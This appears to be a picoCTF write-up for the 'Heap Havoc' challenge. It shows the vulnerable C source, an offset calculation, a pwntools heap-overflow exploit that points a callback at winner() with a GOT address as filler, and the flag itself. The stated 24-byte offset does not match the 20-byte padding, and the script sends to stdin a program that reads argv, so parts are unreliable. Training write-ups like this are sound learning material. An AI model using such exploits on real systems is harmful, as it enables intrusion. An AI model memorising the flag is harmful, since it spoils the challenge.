# BINARY EXPLOITATION CHALLENGE
---
### Name        : Heap Havoc
### Category    : Binary Exploitation
### Difficulity : Hard
---

## THE STEP OF MINE TO SOLVE THIS CHALLENGE
### 1. Examine the security of ELF file
First thing that I do to solve this challenge is examine the code.<br>
Examine the type of file by typing:
```bash
file ./vuln
pwn checksec ./vuln
```
from the examination we got the result:

```bash
[*] Arch  : i386-32-little
    RELRO : Partial RELRO
    Stack : No Canary Found
    NX    : NX Enabled
    PIE   : No PIE
```
We know that the file has no much protection, only NX, it means we can't execute the stack. <br>
But seeing from the title of challenge, seems we will not deal with the stack, instead we will deal with the heap. so it's fine, the NX protection will not be our obstacle
### 2. Review the code
And then I open the `vuln.c` file, and here's the code
```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <time.h>

struct internet {
    int priority;
    char *name;
    void (*callback)();
};

void winner() {
    FILE *fp;
    char flag[256];

    fp = fopen("flag.txt", "r");
    if (fp == NULL) {
        perror("Error opening flag.txt");
        exit(1);
    }

    if (fgets(flag, sizeof(flag), fp) != NULL) {
        printf("FLAG: %s\n", flag);
    } else {
        printf("Error reading flag\n");
    }

    fclose(fp);
}

int main(int argc, char **argv) {
    struct internet *i1, *i2, *i3;
    printf("Enter two names separated by space:\n");
    fflush(stdout);   
    if (argc != 3) {
        printf("Usage: ./vuln <name1> <name2>\n", argv[0]);
        fflush(stdout);  
        return 1;
    }

i1 = malloc(sizeof(struct internet));
i1->priority = 1;
i1->name = malloc(8);
i1->callback = NULL;

i2 = malloc(sizeof(struct internet));
i2->priority = 2;
i2->name = malloc(8);
i2->callback = NULL;

strcpy(i1->name, argv[1]);  
strcpy(i2->name, argv[2]); 

if (i1->callback) i1->callback();
if (i2->callback) i2->callback();

    printf("No winners this time, try again!\n");
}
```
This is the code, after I examine it for a while, I know where is the vulnerable. Let us just focus on the `malloc` section, when the struct was initiated as `i1, i2, and i3`.<br>
first one, the struct with label __i1__ it was initiated first into the heap. But inside the struct __i1__, __i1->name__ was also initiated to heap, so it would make new area of heap for __i1->name__ in the amount of 8 bytes.<br>
second one, same, the strut with label __i2__ was initiated to the heap and follow up with __i1->name__. <br>

### 3. The Idea of Exploiting
We know that there is `if (i2->callback) i2->callback()` this function pointer will call the whatever function inside the function pointer, but as we know the value of `callback` is NULL. We have to change it into `winner` address, so how we do it? yup, __Heap Overflow__, it so much alike with __Buffer Overflow__ the difference only where it was exploited.

### 4. Create the exploit
Because we already know what should we do, that is change the `i2->callback` value into winner address with __Heap Overflow__ so here we go, we should know the payload from our __input__ (i1->name) to our __target__ (i2->callback).<br>

## Find the offset
Actually there is a fast method, but because the chunk isn't much, so I calculate it manually.<br>

---
    i1->name heap: 8 byte<br>
    i2 metadata  : 8 byte<br>
    i2->priority : 4 byte<br>
    i2->name     : 4 byte<br>
---

so total of byte is 24, that's the offset. But there is one problem, i2-> name was holding an heap address as well, meanwhile, there is also<br>
`strcpy(i2->name, argv[2])` mean we will write a text inside the heap of i2-> name, so we can't put random address or it could make a crash, the solution find the address that has `w` argument, it mean writeable, so everything will fine, I take the random heap number actually. but we can take an example from the hint number 2 like in `cylabacademy.org`
<details>
 <summary>HINT NO.2</summary>

 <br>
 `objdump -R can help to locate dynamic symbols like puts.`
</details>
you can also use `puts` address to fill the i2->name and follow up with `winner` address, so here's the payload.<br>

## Create the exploit
```python
from pwn import *

elf = context.binary = ELF('./vuln')
io = remote('foggy-cliff.picoctf.net', 60047)


winner_address = 0x080492b6
puts_address = 0x0804c038

payload = b"A" * 20 + p32(puts_address) + p32(winner_address) + b" A"

log.info('SENDING THE PAYLOAD')
io.sendline(payload)
io.clean()
print(io.recvall().decode())
```

Here's the flag
<details>
    <summary>THE FLAG</summary>

    <br>
    FLAG: picoCTF{h34p_0v3rfl0w_7bb56fe9}
</details>
